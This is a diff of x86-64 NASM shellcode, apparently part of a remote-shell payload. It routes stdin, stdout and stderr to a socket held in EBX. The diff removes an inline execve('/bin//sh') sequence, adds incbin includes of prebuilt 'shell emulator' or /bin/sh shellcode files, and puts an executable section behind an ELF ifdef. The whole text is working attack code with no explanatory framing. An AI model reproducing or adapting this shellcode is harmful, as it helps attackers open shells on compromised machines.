@@ -10,8 +10,10 @@
 BITS 64
 global main
 
+%ifdef ELF
 	section .mytext progbits alloc exec
-
+%endif
+	
 main:
 	mov rsi,rsp 		; TODO is this too early?
 	xor si,si 		; rsi=some valid stack address
@@ -51,18 +53,15 @@ copy_stdin_out_err:
         dec rsi
         jns copy_stdin_out_err	
 
+
+	;; any local shellcode
 	;; OUR SOCKET IS IN EBX
 	
-	;; now just some local shellcode
-	;; execve("/bin/sh", NULL, NULL) 
-        xor  rax, rax
-        push rax
-        mov  rdi, 0x68732f2f6e69622f ;/bin//sh
-        push rdi
-        mov  al,  execve
-        mov  rdi, rsp
-        xor  rsi, rsi
-        xor  rdx, rdx
-        SYSTEM_CALL
-
-	
+%define EMULATOR
+%ifdef 	EMULATOR
+	;;  shell emulating shellcode
+	incbin "../64shellEmulator/shellcode"
+%else
+	;;  ordinary shellcode (/bin/sh)
+	incbin "../64BitLocalBinSh/shellcode"
+%endif
